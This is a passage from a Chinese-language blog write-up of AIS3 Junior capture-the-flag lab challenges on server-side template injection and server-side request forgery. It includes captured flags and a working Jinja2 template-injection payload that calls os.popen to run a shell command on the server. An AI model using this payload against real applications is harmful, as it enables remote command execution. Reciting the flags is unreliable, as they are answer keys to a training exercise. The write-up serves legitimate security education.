                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/STI01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{._JinjaTWOOOO.__[&quot;SSTI]_.succ3ssXDD._}</code></p>

  </div>
<h3 id="STI-02">STI 02</h3>

  <div class="note p-4 mb-4 rounded-small info">
    <p>利用與上題同樣的payload，即可取得FLAG<br>
<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat FLAG').read()</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/STI02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}</code></p>

  </div>
<h2 id="08-Server-Side-Request-Forgery">08 - Server-Side Request Forgery</h2>
<h3 id="SRF-01">SRF 01</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>一個可以分析圖片的網站 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SRF01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>先攔截看看封包內容 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SRF01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>因為題目提到 FLAG 藏在 <code>/app/FLAG</code> 中，將 url 改為 <code>/app/FLAG</code> 後重新送出即可在原始碼中發現編碼過的字串<br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SRF01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>使用 base64 decode 後，即可得到 FLAG</p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{file://SSRF___XDDD}</code></p>

  </div>
<h3 id="SRF-02">SRF 02</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>與上一題類似的網站</p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>題目雖然沒有說 FLAG 藏在哪裡，但 <s>我通靈推測藏在 localhost 中</s> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SRF02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>使用 base64 decode 後，即可得到 FLAG</p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{http://BROAccessLOCAL}</code></p>

  </div>
]]></content>
      <categories>
        <category>課程學習</category>
        <category>AIS3</category>
      </categories>
      <tags>
        <tag>課程</tag>
        <tag>AIS3</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
</search>
